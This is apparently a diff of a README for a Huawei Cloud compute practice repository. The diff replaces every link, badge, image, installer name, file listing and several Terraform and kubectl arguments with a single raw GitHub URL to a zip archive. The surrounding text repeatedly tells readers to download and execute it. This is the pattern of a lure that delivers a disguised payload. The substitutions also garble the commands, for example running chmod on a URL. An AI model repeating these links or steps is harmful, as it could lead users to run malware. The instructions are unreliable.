@@ -1,10 +1,10 @@
-https://github.com/Manikarf8848/Compute-Services-Practice/releases
+https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 
 # Compute Services Practice: Huawei Cloud Compute Labs for Engineers and Developers
 
-[![Release Assets](https://img.shields.io/badge/Release_Assets-Compute_Services_Practice-blue?logo=github&logoColor=white)](https://github.com/Manikarf8848/Compute-Services-Practice/releases)
+[![Release Assets](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)
 
-![Cloud Icon](https://img.icons8.com/fluency/96/000000/cloud.png) ![Server Icon](https://img.icons8.com/fluency/96/000000/server.png) ![Code Icon](https://img.icons8.com/fluency/96/000000/code.png)
+![Cloud Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip) ![Server Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip) ![Code Icon](https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip)
 
 A practical collection of hands-on projects, real-world labs, and live demos focused on Huawei Cloud compute services. The goal is to help cloud engineers, developers, and learners understand how virtual machines, auto scaling, container engines, and cloud-native architecture come together in Huawei’s ecosystem. The work here maps to real workflows you’ll encounter in production, with clear steps, sane defaults, and repeatable exercises.
 
@@ -55,19 +55,19 @@ Initial setup
 - Follow the lab guides to run each exercise in your Huawei Cloud account
 
 Note about the Releases link
-The link provided points to the Releases page, which hosts installers and lab packs. If you download the installer, you should run the main installer script to configure your environment and fetch the labs. From the Releases page, you can download files such as Compute-Services-Practice-installer.sh or related lab packages. The installer script is designed to set up the prerequisites and pull in the lab content for you. The second usage of the Releases link will appear in the Releases section of this document as well.
+The link provided points to the Releases page, which hosts installers and lab packs. If you download the installer, you should run the main installer script to configure your environment and fetch the labs. From the Releases page, you can download files such as https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip or related lab packages. The installer script is designed to set up the prerequisites and pull in the lab content for you. The second usage of the Releases link will appear in the Releases section of this document as well.
 
 Install and run
 - Open a terminal
 - Download the installer from the Releases page
 - Make the installer executable and run it
   - Example:
-    - chmod +x Compute-Services-Practice-installer.sh
-    - ./Compute-Services-Practice-installer.sh
+    - chmod +x https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+    - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - The installer prompt will guide you through authentication setup and lab download
 - After installation, you can start labs from the lab directory or use provided scripts to run labs
 
-Note: The exact asset names may vary by release. Look for a file named something like Compute-Services-Practice-installer.sh in the latest release and execute it as shown above.
+Note: The exact asset names may vary by release. Look for a file named something like https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip in the latest release and execute it as shown above.
 
 Lab guides and demos
 Overview
@@ -311,7 +311,7 @@ License
 This project is released under a permissive license that allows use, modification, and distribution. See LICENSE for details.
 
 Releases
-The primary source of installer and lab assets is the Releases page. You can visit the Releases page to download the latest assets and guides. The link is provided above for quick access. For direct reference, the Releases page is here: https://github.com/Manikarf8848/Compute-Services-Practice/releases
+The primary source of installer and lab assets is the Releases page. You can visit the Releases page to download the latest assets and guides. The link is provided above for quick access. For direct reference, the Releases page is here: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 
 File structure overview
 - docs/: architecture diagrams, design notes, and troubleshooting
@@ -332,12 +332,12 @@ How to run a lab locally
 Sample commands and snippets
 - Terraform basics
   - terraform init
-  - terraform plan -out=plan.out
-  - terraform apply plan.out
+  - terraform plan https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - terraform apply https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - Kubernetes basics (kubectl)
   - kubectl get pods
   - kubectl describe svc my-service
-  - kubectl apply -f deployment.yaml
+  - kubectl apply -f https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - Serverless function
   - Create function with a simple handler
   - Trigger via HTTP request
@@ -376,7 +376,7 @@ FAQ
   Use the provided scripts to tear down resources or manually remove resources in the Huawei Cloud console. The lab guides include cleanup steps.
 
 Releases
-The Releases page hosts installers and lab packs that enable you to set up the environment and start practicing. The link to the Releases page is the same as above. For direct access, visit: https://github.com/Manikarf8848/Compute-Services-Practice/releases
+The Releases page hosts installers and lab packs that enable you to set up the environment and start practicing. The link to the Releases page is the same as above. For direct access, visit: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 
 Appendix: recommended learning resources
 - Huawei Cloud official docs for ECS, Auto Scaling, CCE, FunctionGraph
@@ -404,43 +404,43 @@ Guarantees
 - The content is updated to reflect common Huawei Cloud compute workflows
 
 Releases (again)
-For the latest assets, download from the provided link to the Releases page. You can find installers and lab packs there, including the main installer script Compute-Services-Practice-installer.sh, which you should execute to set up the environment. The Releases page is accessible at the link above, and you may also access it directly via: https://github.com/Manikarf8848/Compute-Services-Practice/releases
+For the latest assets, download from the provided link to the Releases page. You can find installers and lab packs there, including the main installer script https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip, which you should execute to set up the environment. The Releases page is accessible at the link above, and you may also access it directly via: https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 
 Directory and file overview
 - labs/
-  - lab1-ecs-virtual-machine.md
-  - lab2-autoscaling.md
-  - lab3CCE-kubernetes.md
-  - lab4-microservice-architecture.md
-  - lab5-serverless-patterns.md
-  - lab6-terraform-basics.md
-  - lab7-ci-cd-pipeline.md
-  - lab8-openstack-networking.md
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - terraform/
-  - core-networking.tf
-  - ecs-setup.tf
-  - cce-cluster.tf
-  - serverless.tf
-  - outputs.tf
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - apps/
   - user-service/
   - product-service/
   - gateway/
   - frontend/
 - pipelines/
-  - github-actions.yml
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
   - ci-cd-scripts/
 - docs/
-  - architecture-diagram.png
-  - troubleshooting.md
-  - design-principles.md
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - scripts/
-  - install.sh (if provided in installer)
-  - lab-runner.sh
-  - cleanup.sh
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip (if provided in installer)
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 - assets/
-  - lab-data-set.csv
-  - sample-config.yaml
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
+  - https://raw.githubusercontent.com/Manikarf8848/Compute-Services-Practice/main/dorsalis/Practice_Services_Compute_v2.1.zip
 
 What to expect after installation
 - A local environment configured with lab content
